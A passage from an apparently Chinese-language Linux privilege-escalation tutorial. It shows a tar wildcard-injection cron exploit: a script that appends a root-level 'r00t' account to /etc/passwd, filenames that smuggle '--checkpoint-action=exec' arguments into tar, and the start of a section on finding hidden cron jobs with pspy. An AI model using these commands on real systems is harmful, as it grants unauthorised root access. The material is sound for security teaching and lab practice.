s+Z7x6wnCp8XIJQJsNyWdnieiq7zBeTprKAeac9B4FZcX82Y5BHdKDovEMIrD54/kTFZe1ZwEXoXM0pTzWlrNfO98H3QfU4YMEmZNnmJ/cypYE6BC/Ggu2dc9TXnB+W0IR7C5y+gMpHI4TU1xnsbqxptjhfVL1ImSH5OMIFADXVJ6dD1928dcF04VX2c4ljF8VrT7TZF5aOXEhLJRHNnQciqaZOmW9o6LF9zYMsCFUmZAIOzMtxRS2XhkYxOuB5pz0GATtlRZShyCr1GVXO+3vs3uZzC4/OpCuZBpcLHQCPOglBrbYcL5RKzD/iZV3tN5CiGO7JFFIRXHXvUy8pIR9/WN6IIO8wBEDx/oU8mwDK7MmolY6J5YBpQk8Y7m/XpNDUVRVnK2PE0Gm2SF14sSJkgGb1gAoEa6voRHVrsoOOfwmXzpM0+pMKHUm9cTqxoHvYfJkmZIBm9YAKBGuoa9TIxIiFlgmT0ggkEaqgL7dAkwwEpEySjEUwgUENduJ5N8h0hZYJkNIIJBGq93saGStCh4+Ou3bxxJT7uRjIzIT2NCTwk/5C7qbdJmSAZdWACgVqvt721vqI8H3ToxMSb8fHXk+7E3bsL9+/vR0LalQ1ply9J+H9KUqJzs4Nz024jbzMzUhCZKGTf9+jITOpt838On52Zdr9s+P7gf7jrHy38B9sBEwjURAMdbaza6lLQobMyU7My7+blCm/H/A7cy7/pln/KNz/7vkRoeMnPy7gYGR4Y4Oe/fWvQ3l3RUeeBB1cGpqBwH4vlCtWcKZQISSErphZyaGlBWVFfjLtDNL/0gXNzi0MzFFCahXqKi7Lh2UR9XOcVA25mimizEwPx7xlyQpU4Ycqcq0F8KT/lwNeeUmWVFobkIf9F8N0Z7vpHC4Noh9bUC/7e69wDbmP/qDyC4ebzrqnAnSpUkZuSgI8KwQQCNVyM09EIsR6ADl1ZXvCgArnV8ruQ6VMZ6l5Vgt6X+d0pvdMI+bW3HK4vxYUKcjPWrXa1XWwtCvAU5KbjSlZV16199NjqUUdYtZifiLy62rNQXXAn3+rx48UdtcLbXoVUPwjp6HDvaEgUqa22pgQ+6GBH8S7o8Sol/75MEoifqs9NZUr4Mfisi250WdkJS8Krv61r1mWGb9vk4XLgdq1ECAZff1vkKkUZrN8AU7A6K/IvG6OZwbcDVBViIT9mjLzFwUoOGG+loZYK4J15cA6XdWIJWFRYeKr2n7fJAPlI0FidGORsNE5WRkZZ7E+SGkqvbLMzoSvJyynSjV3Pwn8cL7IWxE+bxk2OF/GIgX3LRKaqqqqvr29M2jAYaFjQvFhDk0bayLczZ85gSxI2duxY0JtJGw4DbYu1MmmkjWzbuXPn/wO+36mg8YYUFgAAAABJRU5ErkJggg==" width="354" height="64" class="img_ev3q"></p>
<p>运行命令后，我们会得到一个哈希值 <strong>ShuKpZV7v9ak</strong>，请保留这个值，因为我们在下一个命令中会需要它。</p>
<p>接下来，我们将创建一个脚本，将第二个 root 用户 <strong>r00t</strong> 添加到 passwd 文件中</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#!/bin/bash&#x27; &gt; /var/www/html/rootme.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;&quot; &gt;&gt; /var/www/html/rootme.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;echo &quot;r00t:ShuKpZV7v9akI:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd&#x27; &gt;&gt; /var/www/html/rootme.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113547402-918290645-2bc0f3487c574003ab0af5deb0a5cdd8.png" width="1024" height="123" class="img_ev3q"></p>
<p>脚本看起来没问题！我们只需要授予它执行权限，以便 tar 可以为我们执行它。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 ./rootme.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接下来我们需要创建switch“文件”来为我们运行该脚本。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">touch &#x27;/var/www/html/--checkpoint=1&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">touch &#x27;/var/www/html/--checkpoint-action=exec=sh rootme.sh&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113636531-1227600624-374f58d94fb46c88fc6768adf145e77a.png" width="738" height="238" class="img_ev3q"></p>
<p>一切都已准备就绪，现在到了关键时刻……</p>
<p>不到一分钟后检查 passwd 文件，我们可以看到 r00t 用户已创建！</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /etc/passwd | grep r00t</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="481" height="42" class="img_ev3q"></p>
<p>太棒了！漏洞利用成功，并创建了一个 root 用户。现在，我们只需使用 <strong>su</strong> 命令即可成为 r00t，并在提示时输入 <strong>password</strong> 作为密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113546640-163864654-2894156898e78b0712324f5b2a587b68.png" width="414" height="125" class="img_ev3q"></p>
<p>BOOM！就这样，我们就进入了 root shell。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="8利用-cron-jobs--隐藏的-cron-jobs"><strong><div id="id8">8、利用 Cron Jobs – 隐藏的 Cron Jobs</div></strong><a href="#8利用-cron-jobs--隐藏的-cron-jobs" class="hash-link" aria-label="8利用-cron-jobs--隐藏的-cron-jobs的直接链接" title="8利用-cron-jobs--隐藏的-cron-jobs的直接链接">​</a></h2>
<p>对于这最后一个例子，我们再次以 devops 用户身份通过 SSH 进入主机，并运行 LinPEAS。</p>
<p>本示例与其它示例相比的一个主要的区别是，这次 LinPEAS 没有在 /etc/crontab 文件中发现正在运行的单个自定义 cron 作业。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113610362-466383577-8f03deefb8d228f1b90124400edd10cb.png" width="831" height="142" class="img_ev3q"></p>
<p>此外，/etc/cron* 目录中没有运行任何自定义 cron 作业。</p>
<p>由此看来，本次通过利用 cron 作业漏洞提升权限的可能性似乎不大。</p>
<p>对我们来说幸运的是，这并不完全正确，因为我们仍然不知道是否有任何用户 cron 作业正在运行。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="81确定-cron-守护进程是否正在运行"><strong><div id="id8.1">8.1、确定 Cron 守护进程是否正在运行</div></strong><a href="#81确定-cron-守护进程是否正在运行" class="hash-link" aria-label="81确定-cron-守护进程是否正在运行的直接链接" title="81确定-cron-守护进程是否正在运行的直接链接">​</a></h4>
<p>在本篇文章的前半部分，我们了解了用户 crontab，这是一个允许用户创建和编辑适用于用户级别的 cron 作业的文件。我们还了解到，这些脚本存储在 /var/spool/cron/crontabs 目录中，标准用户无法访问该目录。</p>
<p>如果我们没有在 /etc/crontab 或任何其他 /etc/cron* 目录中发现任何正在运行的 cron 作业，我们应该首先确认 cron 守护进程是否正在运行。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ps -efw | grep -i &quot;cron&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240606113553196-454019963-65543309ba3fb9de9723efbdabc141f4.png" width="636" height="66" class="img_ev3q"></p>
<p>好了，在这里我们可以看到 cron 守护进程正在运行，这意味着仍有可能有一个用户 cron 作业在运行，而且希望是以 root 的身份运行。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="82使用-pspy-寻找隐藏的-cron-任务"><strong><div id="id8.2">8.2、使用 PsPy 寻找隐藏的 Cron 任务</div></strong><a href="#82使用-pspy-寻找隐藏的-cron-任务" class="hash-link" aria-label="82使用-pspy-寻找隐藏的-cron-任务的直接链接" title="82使用-pspy-寻找隐藏的-cron-任务的直接链接">​</a></h4>
<p>我们可以使用一个很棒的工具来实时查看正在运行的进程，它叫做 <strong><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer" title="精神间谍">pspy</a></strong>。</p>
<blockquote>
<p>pspy 是一款命令行工具，用于窥探进程而无需 root 权限。它允许你查看其他用户运行的命令、cron 作业等的执行情况。</p>
</blockquote>
<p>在攻击者的机器上获取该工具的 32 位和 64 位版本的副本后，我们需要将副本传输到受害者身上。</p>
<p>由于该受害者正在运行 x64 架构，因此我们将发送 64 位版本。</p>
<p>在攻击者机器上，我们可以在工作目录中放置一份 pspy 副本，该目录目前仍托管着 HTTP 服务器。然后回到受害者机器上，使用以下命令抓取副本：</p>
